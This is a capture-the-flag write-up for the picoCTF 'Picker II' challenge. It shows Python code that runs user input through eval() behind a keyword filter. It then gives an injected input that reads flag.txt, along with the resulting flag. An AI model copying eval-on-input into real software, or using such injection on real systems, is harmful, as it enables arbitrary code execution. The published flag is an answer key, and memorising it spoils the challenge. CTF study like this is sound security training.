# Picker II

- [Description](#description)
- [Approach](#approach)
- [Flag](#flag)

## Description

Can you figure out how this program works to get the flag? Additional details will be available after launching your challenge instance.

Connect to the program with netcat: `$ nc saturn.picoctf.net 61753`
The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).

## Approach

The main program of `picker-II.py` is as follows:

```python
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      print("test")
      eval(user_input + '()')
    else:
      print('Illegal input')
```

#### `filter()` function

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

The filter function prevents us from evaluating `win()`.

### Alternative approaches

After looking through the other functions provided in `picker-II.py`, there weren't any other useful functions to obtain the flag.

Since `eval()` evaluates the content within the parentheses, I decided to read the contents of the file directly, imitating the `win()` function.

```
$ nc saturn.picoctf.net 61753
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
'NoneType' object is not callable
```

## Flag

`picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}`